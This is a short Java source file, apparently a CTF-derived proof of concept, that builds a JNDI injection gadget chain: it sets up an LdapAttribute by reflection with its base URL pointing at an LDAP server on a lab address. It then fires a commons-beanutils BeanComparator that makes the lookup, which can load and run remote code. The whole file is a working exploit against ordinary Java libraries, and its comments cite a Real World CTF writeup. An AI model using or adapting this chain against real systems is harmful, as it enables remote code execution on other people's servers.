package org.example.gadget;

import org.apache.commons.beanutils.BeanComparator;

import javax.naming.CompositeName;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;


// 适用于1.8、1.4
// 参考：[Real Wolrd CTF 3rd Writeup | Old System](https://mp.weixin.qq.com/s/ClASwg6SH0uij_-IX-GahQ)
public class Test01 {

    public static void main(String[] args) throws Exception {

        String ldapCtxUrl = "ldap://192.168.126.1:1389/a01qe6";
        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
                new Class[] {String.class});
        ldapAttributeClazzConstructor.setAccessible(true);
        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
                new Object[] {"any"});
        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField("baseCtxURL");
        baseCtxUrlField.setAccessible(true);
        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);
        Field rdnField = ldapAttributeClazz.getDeclaredField("rdn");
        rdnField.setAccessible(true);
        rdnField.set(ldapAttribute, new CompositeName("a//b"));

        BeanComparator<Object> beanComparator = new BeanComparator<>();
        setField(beanComparator, "property", "attributeDefinition");
        beanComparator.compare(ldapAttribute, ldapAttribute);


    }

    public static void setField(Object object,String fieldName,Object value) throws Exception{
        Class<?> c = object.getClass();
        Field field = c.getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object,value);
    }

}
